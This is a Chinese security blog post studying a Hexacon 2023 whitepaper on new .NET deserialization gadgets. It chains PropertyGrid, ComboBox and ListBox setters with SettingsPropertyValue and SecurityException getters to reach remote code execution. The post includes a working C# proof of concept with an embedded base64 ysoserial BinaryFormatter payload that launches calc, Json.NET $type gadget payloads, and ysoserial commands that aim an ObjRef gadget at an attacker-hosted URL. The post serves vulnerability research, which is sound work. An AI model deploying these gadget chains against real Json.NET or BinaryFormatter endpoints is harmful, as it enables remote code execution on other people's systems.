
# dotnet反序列化新链学习

[Y4er](https://y4er.com/ "Author")  收录于  类别 [代码审计](https://y4er.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

 2023-10-23  2023-10-23  约 1964 字  预计阅读 4 分钟 

@chudyPB在Hexacon 2023会议上发布了他的dotnet反序列化的研究白皮书，一个长达124页的pdf，这是我看过最强的一篇关于dotnet序列化漏洞的文章。

chudyPB从SolarWinds的json.net反序列化出发，从反序列化到黑名单绕过，其中黑名单绕过用到了多个gadget，其中有SolarWinds代码库中的，也有三方库中的。通过不断的黑名单绕过，展示了SolarWinds的多个历史漏洞。

然后展示了Delta Electronics InfraSuite Device Master中MessagePack的反序列化漏洞，针对该产品的设计架构，然后引出一个更大的利用面，即反序列化的恶意对象如果被再次序列化也会触发某些恶意操作。

[![image.png](assets/1698895989-1225cb826e047f31333d75e10fb81bf5.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/cd0c4c87-4c46-5baa-18a3-80c09f65320f.png "image.png")

对我而言这是一个新的利用面：不安全的序列化（Insecure Serialization），发生在序列化阶段。

接着作者对Insecure Serialization展示了几个gadget，然后由于序列化阶段调用的是getter，所以作者又找了几个getter call的gadget，然后串起来成为新的反序列化gadget。接下来我将主要对这部分进行学习。

# [](#%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e5%ba%8f%e5%88%97%e5%8c%96)\# 不安全的序列化

[![image.png](assets/1698895989-86217bafc61a27e40047e8a358262e33.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f869d6ec-4f83-e14e-546a-017c7a839c48.png "image.png")

## [](#settingspropertyvalue)1 SettingsPropertyValue

[![image.png](assets/1698895989-25d86a91433b6272f268efcbae553743.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/ef895853-17fe-6559-261a-d9ae808704df.png "image.png")

[![image.png](assets/1698895989-14e71a88d759f9f3642e9946525ad1a4.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/02c036a4-f161-abb1-82d4-b6d1245b7f6d.png "image.png")

[![image.png](assets/1698895989-06e2c9610a765a062fe434a65f41e774.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/fd59e16d-3c14-8a8c-90ba-3f170f5a4011.png "image.png")

根据serializeAs进行`binaryformatter.deserialize()`，参数都是可控的。

写出对应代码测试一下

|     |     |
| --- | --- |
| ```plain<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>``` | ```csharp<br>using Newtonsoft.Json;<br>using System.Configuration;<br><br>namespace ConsoleApp2<br>{<br>    internal class Program<br>    {<br>        static void Main(string[] args)<br>        {<br>            SettingsProperty settingsProperty = new SettingsProperty("aa");<br>            settingsProperty.SerializeAs = SettingsSerializeAs.Binary;<br>            SettingsPropertyValue settingsPropertyValue = new SettingsPropertyValue(settingsProperty);<br>            settingsPropertyValue.Deserialized = false;<br>            // ysoserial.exe -c calc -g TextFormattingRunProperties -f binaryformatter<br>            settingsPropertyValue.SerializedValue = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw==";<br>            JsonConvert.SerializeObject(settingsPropertyValue, new JsonSerializerSettings() { TypeNameHandling = TypeNameHandling.All });<br>        }<br>    }<br>}<br>``` |

[![image.png](assets/1698895989-9d2dcce6f79b5ef282776ccd9bbd1038.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/d6b05262-d404-b3e0-907f-6ac0e06c65dd.png "image.png")

可以看到通过序列化调用getter时弹出了计算器

## [](#securityexception)2 SecurityException

[![image.png](assets/1698895989-d8e3a78767e184329d65ba812d71bf7b.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/e105c3f0-8e1f-80fd-d6cd-14bf9ce29e85.png "image.png")

[![image.png](assets/1698895989-cbf331cd1715dc3b97f50b724c310cef.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/3cbbbd2d-3784-9367-eac2-e05f94d6c514.png "image.png")

[![image.png](assets/1698895989-0547decf1dc0cc68577006e989cd1869.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/fad67791-c345-c15e-9dca-4462c09f34d1.png "image.png")

[![image.png](assets/1698895989-fed1925102d52dbc1f3d0c9f2d0aa137.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/83e01364-07db-d4b0-adee-8eee4ffb01d1.png "image.png")

朴实无华，但是在实际写的时候发现了问题。直接调用getter确实可以，但是通过json.net不行，究其原因发现json.net在序列化时，如果重写了序列化函数GetObjectData，则会调用该函数来序列化，binaryformatter也是一样。

[![image.png](assets/1698895989-70f29bce051b8ade20222e22a358c9e9.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/10c95f78-6604-7e84-b853-3e4edc9d25f9.png "image.png")

所以不会触发getter。作者也写了限制

[![image.png](assets/1698895989-073cffbc9e8a7f2a259836fc7797e670.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/5ed5cc82-cff3-621f-ae71-95547b643d78.png "image.png")

不过无所谓，可以和后面的任意getter call串起来。

## [](#compilerresults)3 CompilerResults

dll加载，略

# [](#%e4%bb%bb%e6%84%8fgetter-call)\# 任意getter call

[![image.png](assets/1698895989-197923af2d97ac0fabf600e001213499.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/1eb64d3f-5fa3-ab55-5e45-8bcc3777a7d3.png "image.png")

## [](#propertygrid)1 PropertyGrid

他的SelectedObjects setter中可以调用obj的所有getter

|     |     |
| --- | --- |
| ```plain<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```json<br>{<br>    "$type": "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",<br>    "SelectedObjects": [<br>        {<br>            "your": "object"<br>        }<br>    ]<br>}<br>``` |

东西太多 直接看堆栈

|     |     |
| --- | --- |
| ```plain<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```fallback<br>System.Object System.ComponentModel.PropertyDescriptor::GetValue(System.Object)<br>System.Windows.Forms.PropertyGridInternal.GridEntry[]<br>System.Windows.Forms.PropertyGridInternal.GridEntry::GetPropEntries(System.Windows.Forms.PropertyGridInternal.GridEntry,System.Object,System.Type)<br>System.Boolean System.Windows.Forms.PropertyGridInternal.GridEntry::CreateChildren(System.Boolean)<br>System.Void System.Windows.Forms.PropertyGridInternal.GridEntry::Refresh()<br>System.Void System.Windows.Forms.PropertyGrid::UpdateSelection()<br>System.Void System.Windows.Forms.PropertyGrid::RefreshProperties(System.Boolean)<br>System.Void System.Windows.Forms.PropertyGrid::Refresh(System.Boolean)<br>System.Void System.Windows.Forms.PropertyGrid::set_SelectedObjects(System.Object[])<br>``` |

循环遍历SelectedObjects，然后调用object的所有getter

## [](#combobox)2 ComboBox

|     |     |
| --- | --- |
| ```plain<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>``` | ```json<br>{<br>    "$type": "System.Windows.Forms.ComboBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",<br>    "Items": [<br>        {<br>            "your": "obj"<br>        }<br>    ],<br>    "DisplayMember": "obj的成员名称",<br>    "Text": "whatever"<br>}<br>``` |

## [](#listbox)3 ListBox

和ComboBox大同小异

|     |     |
| --- | --- |
| ```plain<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>``` | ```json<br>{<br>    "$type": "System.Windows.Forms.ListBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",<br>    "Items": [<br>        {<br>            "your": "object"<br>        }<br>    ],<br>    "DisplayMember": "MaliciousMember",<br>    "Text": "whatever"<br>}<br>``` |

## [](#checkedlistbox)4 CheckedListBox

和上面一样，不写了

# [](#%e4%b8%b2%e8%b5%b7%e6%9d%a5)\# 串起来

-   PropertyGrid+SecurityException
-   PropertyGrid+SettingsPropertyValue
-   ListBox+SecurityException
-   ListBox+SettingsPropertyValue
-   ComboBox+SecurityException
-   ComboBox+SettingsPropertyValue
-   CheckedListBox+SecurityException
-   CheckedListBox+SettingsPropertyValue

写几个简单的

## [](#propertygrid--securityexception)1 PropertyGrid + SecurityException

|     |     |
| --- | --- |
| ```plain<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>``` | ```json<br>{<br>    "$type": "System.Windows.Forms.PropertyGrid, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",<br>    "SelectedObjects": [<br>        {<br>            "$type": "System.Security.SecurityException",<br>            "ClassName": "System.Security.SecurityException",<br>            "Message": "Security error.",<br>            "Data": null,<br>            "InnerException": null,<br>            "HelpURL": null,<br>            "StackTraceString": null,<br>            "RemoteStackTraceString": null,<br>            "RemoteStackIndex": 0,<br>            "ExceptionMethod": null,<br>            "HResult": -2146233078,<br>            "Source": null,<br>            "WatsonBuckets": null,<br>            "Action": 0,<br>            "FirstPermissionThatFailed": null,<br>            "Demanded": null,<br>            "GrantedSet": null,<br>            "RefusedSet": null,<br>            "Denied": null,<br>            "PermitOnly": null,<br>            "Assembly": null,<br>            "Method": "base64-encoded-binaryformatter-gadget",<br>            "Method_String": null,<br>            "Zone": 0,<br>            "Url": null<br>        }<br>    ]<br>}<br>``` |

[![image.png](assets/1698895989-77b1da91738a35511da06bcbce8b0f1a.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/b7b49ddd-d361-403a-938a-1b8491861c78.png "image.png")

json.net对其进行处理时，会先把里层的SecurityException对象反序列化出来，然后把SecurityException对象传递给SelectedObjects的setter，这个setter可以调用SecurityException对象的getter，当执行到get\_Method时就触发了BinaryFormatter rce。

由此，从setter->getter->rce的链串起来了。

## [](#comboboxsettingspropertyvalue)2 ComboBox+SettingsPropertyValue

|     |     |
| --- | --- |
| ```plain<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>``` | ```json<br>{<br>    "$type": "System.Windows.Forms.ComboBox, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",<br>    "Items": [<br>        {<br>            "$type": "System.Configuration.SettingsPropertyValue, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",<br>            "Name": "test",<br>            "IsDirty": false,<br>            "SerializedValue": {<br>                "$type": "System.Byte[], mscorlib",<br>                "$value": "base64-encoded-binaryformatter-gadget"<br>            },<br>            "Deserialized": false<br>        }<br>    ],<br>    "DisplayMember": "PropertyValue",<br>    "Text": "whatever"<br>}<br>``` |

[![image.png](assets/1698895989-c11e77e67542530aa7e85aff9c14e221.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/0e70aa8c-c5e0-9483-ed83-f9c2196e5f4b.png "image.png")

同样setter->getter->rce

# [](#%e5%85%b6%e4%bb%96gadget)\# 其他gadget

## [](#objref)1 ObjRef

今天才看到ysoserial.net新增了很多gadget，其中有一条类似于java中的jrmp client，找了找，原始的利用文章在这， [https://code-white.com/blog/2022-01-dotnet-remoting-revisited/](https://code-white.com/blog/2022-01-dotnet-remoting-revisited/)

利用也很简单

|     |     |
| --- | --- |
| ```plain<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```cmd<br># generate a SOAP payload for popping MSPaint<br>ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -o raw -c MSPaint.exe  > MSPaint.soap<br><br># start server to deliver the payload on all interfaces<br>RogueRemotingServer.exe --wrapSoapPayload http://0.0.0.0/index.html MSPaint.soap<br><br># test the ObjRef gadget with the target http://attacker/index.html<br>ysoserial.exe -f BinaryFormatter -g ObjRef -o raw -c http://attacker/index.html -t<br>``` |

通过Remoting来进行soap反序列化，其实也能用来做dnslog。

## [](#ssrf-picturebox)2 SSRF PictureBox

[![image.png](assets/1698895989-e8fd2cb569f847e98ef5e3c2c3e4974f.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/f1614740-0ed2-eb77-c099-648899d3c5ba.png "image.png")

[![image.png](assets/1698895989-9af913ff23850097545d93bd2e14e37a.png)](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/593424/534d6c7f-3f46-b003-4c7a-29fd30ee1f59.png "image.png")

比较可惜的是PictureBox没继承Serializable接口，不能被BinaryFormatter这种原生formatter序列化。

## [](#dotnet5)3 dotnet5

白皮书最后提到了dotnet5的payload，我觉得都不太好用，需要启用wpf，或者需要PresentationFramework.dll，而且都是dll加载，不过也算是新的gadget了，记一下。

1.  ObjectDataProvider
2.  BaseActivationFactory
3.  CompilerResults

# [](#%e6%80%bb%e7%bb%93)\# 总结

看我文章不如看原pdf。

文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。

![/img/avatar.jpg](assets/1698895989-1b3164074538e5ae37b3b3cb770dea13.jpg "/img/avatar.jpg")

*如果你觉得这篇文章对你有所帮助，欢迎赞赏或关注微信公众号～*

![](assets/1698895989-8bdcd25e706544792023a36eacd294a4.png)![](assets/1698895989-52d849f4506b7f59599c6e1fa13a9240.png)![](assets/1698895989-fa7467e553500deb8c969418661fea6b.jpg)

更新于 2023-10-23

 [dotnet](https://y4er.com/tags/dotnet/)

[返回](javascript:) | [主页](https://y4er.com/)

[devtunnel 微软的隧道工具](https://y4er.com/posts/devtunnel-the-tunneling-tool-of-microsoft/ "devtunnel 微软的隧道工具") [dnlib使用](https://y4er.com/posts/dnlib-usage/ "dnlib使用")

# 0 Comments *\- powered by [utteranc.es](https://utteranc.es/)*

![@anonymous](assets/1698895989-194988521e6ab74c69586cecef5a440c.svg)

Write Preview

[↓↓↓](https://guides.github.com/features/mastering-markdown/)  
  
Styling with Markdown is supported  
  
[↑↑↑](https://guides.github.com/features/mastering-markdown/)

[↓↓↓](https://api.utteranc.es/authorize?redirect_uri=https%3A%2F%2Fy4er.com%2Fposts%2Fdotnet-new-gadget%2F)  
  
Sign in with GitHub  
  
[↑↑↑](https://api.utteranc.es/authorize?redirect_uri=https%3A%2F%2Fy4er.com%2Fposts%2Fdotnet-new-gadget%2F)
